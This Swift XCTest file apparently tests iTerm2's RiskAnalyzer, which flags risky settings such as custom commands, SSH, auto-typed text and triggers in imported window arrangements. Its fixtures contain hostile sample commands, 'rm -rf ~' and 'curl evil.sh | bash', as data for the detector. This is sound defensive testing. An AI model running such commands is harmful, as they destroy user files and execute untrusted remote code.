import XCTest
@testable import iTerm2SharedARC

final class iTermArrangementTrustGateTests: XCTestCase {
    private func sessionView(bookmark: [String: Any] = [:],
                             program: [String: Any]? = nil) -> [String: Any] {
        var session: [String: Any] = ["Bookmark": bookmark]
        if let program {
            session["Program"] = program
        }
        return [
            "View Type": "SessionView",
            "Session": session
        ]
    }

    private func splitter(subviews: [[String: Any]]) -> [String: Any] {
        return [
            "View Type": "Splitter",
            "Subviews": subviews
        ]
    }

    private func window(tabs: [[String: Any]]) -> [String: Any] {
        return [
            "Tabs": tabs.map { ["Root": $0] }
        ]
    }

    func testEmptyArrangementHasNoFindings() {
        let summary = RiskAnalyzer.analyze(windows: [])
        XCTAssertTrue(summary.findings.isEmpty)
    }

    func testBareSessionReportsOneProfile() {
        let arrangement = [window(tabs: [sessionView()])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("1 embedded session profile") })
    }

    func testCustomCommandInBookmarkIsReported() {
        let bookmark: [String: Any] = [
            "Custom Command": "Yes",
            "Command": "/bin/bash -c 'rm -rf ~'"
        ]
        let arrangement = [window(tabs: [sessionView(bookmark: bookmark)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("1 custom command") })
    }

    func testSSHBookmarkIsReportedSeparately() {
        let bookmark: [String: Any] = ["Custom Command": "SSH"]
        let arrangement = [window(tabs: [sessionView(bookmark: bookmark)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("1 SSH connection") })
        XCTAssertFalse(summary.findings.contains { $0.contains("custom command") })
    }

    func testProgramDictCounts() {
        let program: [String: Any] = ["Type": "Command", "Command": "/usr/bin/evil"]
        let arrangement = [window(tabs: [sessionView(program: program)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("1 custom command") })
    }

    func testShellLauncherProgramIsNotReportedAsCommand() {
        let program: [String: Any] = ["Type": "Shell Launcher"]
        let arrangement = [window(tabs: [sessionView(program: program)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertFalse(summary.findings.contains { $0.contains("custom command") })
    }

    func testInitialTextIsReported() {
        let bookmark: [String: Any] = ["Initial Text": "curl evil.sh | bash"]
        let arrangement = [window(tabs: [sessionView(bookmark: bookmark)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("text that will be typed") })
    }

    func testEmptyInitialTextIsNotReported() {
        let bookmark: [String: Any] = ["Initial Text": ""]
        let arrangement = [window(tabs: [sessionView(bookmark: bookmark)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertFalse(summary.findings.contains { $0.contains("text that will be typed") })
    }

    func testTriggersAreReported() {
        let bookmark: [String: Any] = ["Triggers": [["regex": "foo"], ["regex": "bar"]]]
        let arrangement = [window(tabs: [sessionView(bookmark: bookmark)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("2 triggers") })
    }

    func testSmartSelectionRulesWithActionsAreReported() {
        let bookmark: [String: Any] = [
            "Smart Selection Rules": [
                ["regex": "foo", "actions": [["action": 1]]],
                ["regex": "bar", "actions": []],
                ["regex": "baz"]
            ]
        ]
        let arrangement = [window(tabs: [sessionView(bookmark: bookmark)])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("1 smart-selection rule") })
    }

    func testRecursiveSplitterWalks() {
        let inner = sessionView(bookmark: ["Custom Command": "Yes"])
        let outer = splitter(subviews: [splitter(subviews: [inner, inner])])
        let arrangement = [window(tabs: [outer])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("2 embedded session profiles") })
        XCTAssertTrue(summary.findings.contains { $0.contains("2 custom commands") })
    }

    func testMultipleRiskTypesAccumulate() {
        let bookmark1: [String: Any] = [
            "Custom Command": "Yes",
            "Initial Text": "echo go",
            "Triggers": [["regex": "a"]]
        ]
        let bookmark2: [String: Any] = ["Custom Command": "SSH"]
        let arrangement = [window(tabs: [
            sessionView(bookmark: bookmark1),
            sessionView(bookmark: bookmark2)
        ])]
        let summary = RiskAnalyzer.analyze(windows: arrangement)
        XCTAssertTrue(summary.findings.contains { $0.contains("custom command") })
        XCTAssertTrue(summary.findings.contains { $0.contains("SSH connection") })
        XCTAssertTrue(summary.findings.contains { $0.contains("text that will be typed") })
        XCTAssertTrue(summary.findings.contains { $0.contains("trigger") })
    }
}
